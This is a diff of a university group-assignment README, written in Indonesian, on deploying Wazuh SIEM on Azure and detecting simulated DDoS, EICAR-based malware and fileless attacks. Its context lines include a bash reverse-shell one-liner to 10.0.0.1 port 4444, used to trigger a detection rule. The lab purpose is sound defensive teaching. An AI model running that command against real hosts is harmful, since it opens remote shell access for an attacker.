@@ -1,8 +1,8 @@
 #  MIKS Group Task #1 — Wazuh SIEM Deployment & Attack Simulation
 
-> **Mata Kuliah:** Manajemen Insiden Keamanan Siber (MIKS)  
-> **Institut Teknologi Sepuluh Nopember (ITS)**  
-> **Kelompok 2**
+**Mata Kuliah:** Manajemen Insiden Keamanan Siber (MIKS)  
+**Institut Teknologi Sepuluh Nopember (ITS)**  
+**Kelompok 2**
 
 ---
 
@@ -139,7 +139,7 @@ Berikut adalah alur kerja keseluruhan project dari awal hingga akhir:
 3. Pastikan ketiga VM berada dalam **Resource Group** dan **Virtual Network** yang sama agar bisa berkomunikasi secara internal
 
 **Screenshot: Azure Portal — Ketiga VM dalam status Running**
-> *(Tambahkan screenshot Azure Portal di sini)*
+*(Tambahkan screenshot Azure Portal di sini)*
 
 ### Langkah 2: Instalasi Wazuh Manager (All-in-One)
 
@@ -173,7 +173,7 @@ systemctl enable wazuh-agent
 systemctl start wazuh-agent
 ```
 
-> Ulangi langkah yang sama untuk **Agent 2** (`70.153.25.91`).
+Ulangi langkah yang sama untuk **Agent 2** (`70.153.25.91`).
 
 ### Langkah 4: Instalasi Nginx di Agent 1
 
@@ -184,7 +184,7 @@ sudo systemctl start nginx
 ```
 
 **Screenshot: Wazuh Dashboard — Kedua Agent terhubung (Active)**
-> *(Tambahkan screenshot Dashboard menunjukkan agent connected)*
+*(Tambahkan screenshot Dashboard menunjukkan agent connected)*
 
 ---
 
@@ -261,10 +261,10 @@ sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -E "100010|100011|HTTP Flo
 | 100011 | 10 (Critical) | HIGH VOLUME HTTP Flood — DDoS Attack! | 200+ request / 30 detik |
 
 **Screenshot: Alert DDoS di Wazuh Dashboard**
-> *(Tambahkan screenshot alert DDoS dari Dashboard)*
+*(Tambahkan screenshot alert DDoS dari Dashboard)*
 
 **Screenshot: Alert DDoS di Terminal Manager**
-> *(Tambahkan screenshot terminal `tail -f` menunjukkan alert)*
+*(Tambahkan screenshot terminal `tail -f` menunjukkan alert)*
 
 ---
 
@@ -308,7 +308,7 @@ Direktori `/home/azureuser/malware_test` akan dipantau secara **real-time**. Set
 echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /home/azureuser/malware_test/eicar.com
 ```
 
-> **Catatan:** EICAR **bukan** virus sungguhan. Ini adalah string test yang disepakati oleh seluruh industri antivirus untuk menguji apakah sistem deteksi berfungsi dengan baik.
+**Catatan:** EICAR **bukan** virus sungguhan. Ini adalah string test yang disepakati oleh seluruh industri antivirus untuk menguji apakah sistem deteksi berfungsi dengan baik.
 
 ### Hasil yang Diharapkan
 
@@ -316,7 +316,7 @@ echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /h
 2. **VirusTotal Alert:** VirusTotal mengonfirmasi bahwa hash file `eicar.com` adalah **Malicious** dan terdeteksi oleh 60+ antivirus engine
 
 **Screenshot: Alert VirusTotal di Wazuh Dashboard**
-> *(Tambahkan screenshot alert VirusTotal dari Dashboard)*
+*(Tambahkan screenshot alert VirusTotal dari Dashboard)*
 
 ---
 
@@ -380,7 +380,7 @@ Skenario: Attacker telah berhasil masuk ke Agent 1 dan menjalankan **Reverse She
 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 ```
 
-> **Penjelasan:** Perintah di atas tidak membuat file `.sh` atau `.py`. Perintah ini langsung dieksekusi oleh interpreter Bash di dalam RAM, membuka koneksi jaringan balik (reverse connection) ke IP attacker. Ini adalah contoh klasik teknik **Living off the Land**.
+**Penjelasan:** Perintah di atas tidak membuat file `.sh` atau `.py`. Perintah ini langsung dieksekusi oleh interpreter Bash di dalam RAM, membuka koneksi jaringan balik (reverse connection) ke IP attacker. Ini adalah contoh klasik teknik **Living off the Land**.
 
 ### Mengapa Ini Relevan dengan Memory Forensics?
 
@@ -400,10 +400,10 @@ FILELESS MALWARE: Suspicious in-memory reverse shell execution detected!
 ```
 
 **Screenshot: Alert Fileless Malware di Wazuh Dashboard**
-> *(Tambahkan screenshot alert Fileless Malware dari Dashboard)*
+*(Tambahkan screenshot alert Fileless Malware dari Dashboard)*
 
 **Screenshot: Alert di Terminal Manager**
-> *(Tambahkan screenshot terminal menunjukkan alert rule 100020)*
+ (Tambahkan screenshot terminal menunjukkan alert rule 100020)*
 
 ---
 
@@ -497,6 +497,4 @@ TASK1_MIKS/
 - **Memory Forensics:** Deteksi malware modern tidak cukup hanya mengandalkan signature-based detection (scan file). Behavioral analysis dan monitoring memori menjadi semakin krusial karena attacker semakin banyak menggunakan teknik fileless.
 - **Cloud Cost Optimization:** VM Azure harus dimatikan (deallocated) saat tidak digunakan untuk menghemat biaya. Perlu diwaspadai bahwa IP Public dapat berubah setelah VM di-restart.
 
----
-
-> **Kelompok 2 — MIKS ITS 2026**
+**Kelompok 2 — MIKS ITS 2026**
